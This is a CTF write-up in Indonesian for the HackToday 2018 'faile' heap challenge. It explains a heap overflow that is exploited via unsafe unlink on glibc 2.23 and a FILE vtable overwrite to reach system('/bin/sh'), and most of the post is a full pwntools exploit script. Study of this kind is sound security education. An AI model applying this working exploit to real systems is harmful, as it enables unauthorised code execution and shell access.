+++
title = "HackToday 2018 - faile"
date = "2018-09-03 22:16:58"
categories = ["pwn", "writeup"]
+++

> Downloads:
>
> [faile](/assets/hacktoday/faile/faile)
>
> [libc.so](/assets/hacktoday/faile/libc.so)
>
> [solve.py](/assets/hacktoday/faile/solve.py)

```
$ ./faile
┏━┳━━┳┳┳━━━━━━━━━━━━━━━━┳━━┳┳┳┓
┃┏╋┓ ┗╋┛ ┏━╸┏━┓╹┃  ┏━┓ ┏╋┓ ┗╋┛┃
┃┗╋┛ ┏╋┓ ┣━ ┏━┫┃┃  ┣━┛ ┗╋┛ ┏╋┓┃
┃┏╋┓ ┗╋┛ ┃  ┗━┛┃┗━╸┗━┛ ┏╋┓ ┗╋┛┃
┣┻┻┻━━┻━━━━━━━━━━━━━━━━┻┻┻━━┻━┫
┃ PasteBin service. Now with  ┃
┃ super secure id, but is it? ┃
┃   -- by BabyHeap, Inc. --   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
===========
[1] Create
[2] Edit
[3] Delete
[4] Print
[5] Exit
choice: ^C

$ checksec ./faile
[*] '/Challange/faile'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Sedikit info, terdapat beberapa unintended solution di soal ini karena `__malloc_hook` dkk. dapat di overwrite. Ini termasuk kesalahan dalam deploy soal di server. Tidak ada penyesuaian nilai poin yang diberikan untuk soal ini.

Intended solution, analisa statik binary dan lakukan sedikit fuzzing pada input, akan ditemukan bug buffer overflow karena tidak ada pengecekan `(input size == malloc size)`. Dari sini ada beberapa skema bug untuk malloc mengembalikan arbitrary address. Pada solusi ini yang digunakan adalah __unsafe unlink__ karena versi libc masih 2.23. Ok, pointer bisa dikontrol, lalu? _leak address_ dapat dilakukan karena terdapat fungsi print data pada pointer (`choice(4)`). 

`FULL-RELRO`, meskipun sudah memiliki write-where-what tidak bisa overwrite GOT table, terus gimana? Disini lah perannya struct file pointer dari `faile`. Sedikit penjelasan pada file pointer, `struct FILE` memiliki `struct _IO_jump_t` yang merupakan vtable untuk melakukan operasi file I/O seperti read, write, seek, close, dll. Pada vtable pointer inilah yang akan di overwrite untuk dapat mengontrol RIP/PC, pada kasus ini target adalah fungsi system untuk mendapatkan shell. Versi libc masih 2.23 jadi belum ada patch hardening file pointer yang melakukan `_IO_validate` sebelum "_jump_" ke vtable pointer dan gaperlu repot-repot mem-_bypass_ fungsi check tersebut. 

__(cek referensi masih kalau belum jelas)__

Full exlpoit,

```python
#!/usr/bin/env python
from pwn import *
import sys, os

# (Tested on Ubuntu 16.04, GLIBC-2.23)

gdbcmd = '''
b *0x00401254
'''
# context.terminal = 'kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c'.split()

if sys.argv.__len__() == 3:
  r = remote(sys.argv[1], int(sys.argv[2]))
else:
  r = process(sys.argv[1])
  # gdb.attach(r, gdbcmd)

def create(size):
  r.sendlineafter('choice: ', '1')
  r.recvuntil('id: ')
  ID = r.recvline(False)
  r.sendlineafter('size: ', str(size))
  return ID

def edit(ID, content):
  r.sendlineafter('choice: ', '2')
  r.sendlineafter('id: ', ID)
  r.sendlineafter('size: ', str(len(content)))
  r.sendafter('text: ', content)

def delete(ID):
  r.sendlineafter('choice: ', '3')
  r.sendlineafter('id: ', ID)

def _print(ID):
  r.sendlineafter('choice: ', '4')
  r.sendlineafter('id: ', ID)
  leak = r.recvline(False)
  log.info('bin[{}] {}'.format(bins.index(ID), repr(leak)))
  return leak

def _exit():
  r.sendlineafter('choice: ', '5')


bins = [''] * 10

# Step 1: unsafe unlink

# 0x00602020 bins[0]
# 0x00602030 bins[1]
# 0x00602040 bins[2]
# 0x00602050 bins[3]
# 0x00602060 bins[4]
# 0x00602070 bins[5]
# 0x00602080 bins[6]
# 0x00602090 bins[7]
# 0x006020a0 bins[8]
# 0x006020b0 bins[9]
# 0x006020c0 name
# 0x006020.. ...
# 0x006021c0 faile

bins[0] = create(0x80)
bins[1] = create(0x80)
bins[2] = create(0x80)
bins[3] = create(0x80)
bins[4] = create(0x80)

log.info('bin[0] ' + bins[0])
log.info('bin[1] ' + bins[1])
log.info('bin[2] ' + bins[2])
log.info('bin[3] ' + bins[3])
log.info('bin[4] ' + bins[4])

payload  = ''
payload += p64(0)
payload += p64(0)
payload += p64(0x00602010)
payload += p64(0x00602018)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0x80)
payload += p64(0x90)

edit(bins[0], payload)
delete(bins[1])

log.info('bin[0] now should be pointing to 0x602010')

'''
[+] Starting local process '/Challanges/faile': pid 1683
[*] bin[0] 697deecef99bfcff
[*] bin[1] 029f610bcdc347ab
[*] Switching to interactive mode
|--> 697deecef99bfcff, 0x602010 <-- controlled
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
|--> 0000000000000000, (nil)
===========
[1] Create
[2] Edit
[3] Delete
[4] Print
[5] Exit
'''

# Step 2: leak, overwrite File Pointer

PUTS_GOT = 0x00601f80

payload  = ''
payload += p64(0)
payload += p64(0)
payload += p64(int(bins[0], 16))
payload += p64(PUTS_GOT)   # reloc.puts
payload += p64(int(bins[1], 16))
payload += p64(0x006020c0) # fake _IO_jump_t
payload += p64(int(bins[2], 16))
payload += p64(0x006021c0) # faile
payload += p64(int(bins[3], 16))
payload += p64(0x00602050) # (void*) faile
payload += p64(int(bins[4], 16))
payload += p64(0x00602060) # &_IO_jump_t
edit(bins[0], payload)

libc_puts = _print(bins[0])
libc_puts = u64(libc_puts.ljust(8, '\x00'))
libc_base = libc_puts - 0x6f690
system  = libc_base + 0x45390

log.info('LIBC_LEAK ' + hex(libc_puts))
log.info('LIBC_BASE ' + hex(libc_base))
log.info('SYSTEM    ' + hex(system))

faile = _print(bins[2])
faile = u64(faile.ljust(8, '\x00'))

log.info('FAILE ' + hex(faile))

payload  = ''
payload += p64(int(bins[3], 16))
payload += p64(faile)
edit(bins[3], payload)

payload  = '/bin/sh'
edit(bins[3], payload)

payload  = ''
payload += p64(int(bins[4], 16))
payload += p64(faile + 0xd8)
edit(bins[4], payload)

_io_jump_t = _print(bins[4])
_io_jump_t = u64(_io_jump_t.ljust(8, '\x00'))

log.info('_IO_jump  ' + hex(_io_jump_t))

payload = p64(0x006020c0)
edit(bins[4], payload) # _IO_jump_t -> fake _IO_jump_t

# spray
payload  = ''
payload += p64(0) # size_t_dummy
payload += p64(0) # size_t_dummy2
payload += p64(0x401297) # _IO_finish_t
payload += p64(system) # _IO_overflow_t
payload += p64(system) # _IO_underflow_t
payload += p64(system) # _IO_underflow_t
payload += p64(system) # _IO_pbackfail_t
payload += p64(system) # _IO_xsputn_t
payload += p64(system) # _IO_xsgetn_t
payload += p64(system) # _IO_seekoff_t
payload += p64(system) # _IO_seekpos_t
payload += p64(system) # _IO_setbuf_t
payload += p64(system) # _IO_sync_t
payload += p64(system) # _IO_doallocate_t
payload += p64(system) # _IO_read_t
payload += p64(system) # _IO_write_t
payload += p64(system) # _IO_seek_t
payload += p64(system) # _IO_close_t
payload += p64(system) # _IO_stat_t
payload += p64(system) # _IO_showmanyc_t
payload += p64(system) # _IO_imbue_t
edit(bins[1], payload)

_exit()

r.interactive()
```

Referensi:

-  [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
-  [https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)
-  [https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/](https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/)
